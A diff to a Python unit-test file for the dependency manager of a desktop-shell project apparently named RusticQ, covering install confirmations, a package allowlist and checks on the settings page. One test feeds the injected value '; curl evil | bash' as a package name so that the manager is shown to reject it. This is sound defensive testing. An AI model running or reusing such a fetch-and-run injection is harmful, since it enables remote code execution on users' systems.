@@ -32,24 +32,23 @@ class SetupTests(unittest.TestCase):
             with patch.object(deps.shutil, "which", return_value=None):
                 result = deps.status()
         self.assertEqual(result["missing_core"], 4)
-        self.assertEqual(result["missing_optional"], 20)
-        self.assertEqual(len(result["items"]), 24)
+        self.assertEqual(result["missing_optional"], len(deps.catalogue()) - 4)
+        self.assertEqual(len(result["items"]), len(deps.catalogue()))
 
-    def test_launch_requires_explicit_confirmation(self):
+    def test_gui_requires_confirmation_and_allowlist(self):
         with self.assertRaises(ValueError):
-            deps.launch("network", "")
+            deps.gui_manage("network", "install", "")
         with self.assertRaises(ValueError):
-            deps.launch("random-package", "INSTALL random-package")
-        with patch.object(deps.subprocess, "Popen") as popen:
-            with patch.object(deps.shutil, "which", return_value="/usr/bin/pacman"):
-                with patch.object(deps, "is_installed", return_value=True):
-                    value = deps.launch("network", "INSTALL network")
+            deps.gui_manage("random-package", "install", "INSTALL random-package")
+        with self.assertRaises(ValueError):
+            deps.gui_manage("hyprland", "remove", "REMOVE hyprland")
+        with patch.object(deps, "is_installed", return_value=True):
+            value = deps.gui_manage("network", "install", "INSTALL network")
         self.assertTrue(value["ok"])
-        popen.assert_not_called()
 
-    def test_apply_never_accepts_unlisted_package(self):
+    def test_gui_never_accepts_unlisted_package(self):
         with self.assertRaises(ValueError):
-            deps.apply("; curl evil | bash")
+            deps.gui_manage("; curl evil | bash", "install", "INSTALL ; curl evil | bash")
 
     def test_dry_run_and_shell_syntax(self):
         subprocess.run(["bash", "-n", str(ROOT / "scripts/install.sh")], check=True)
@@ -63,8 +62,8 @@ class SetupTests(unittest.TestCase):
         qml = (ROOT / "modules/settings/pages/SettingsIntegrationPage.qml").read_text()
         self.assertIn("Required & optional dependencies", qml)
         self.assertIn("Make RusticQ permanent", qml)
-        self.assertIn("INSTALL " + '" + selectedDependency', qml)
-        self.assertIn("root.dependencyConfirmation === \"INSTALL\"", qml)
+        self.assertIn('"gui", selectedDependency', qml)
+        self.assertIn('selectedDependencyAction.toUpperCase()', qml)
         self.assertIn('"backup-omarchy"', qml)
         self.assertIn('"ENABLE RUSTICQ"', qml)
 
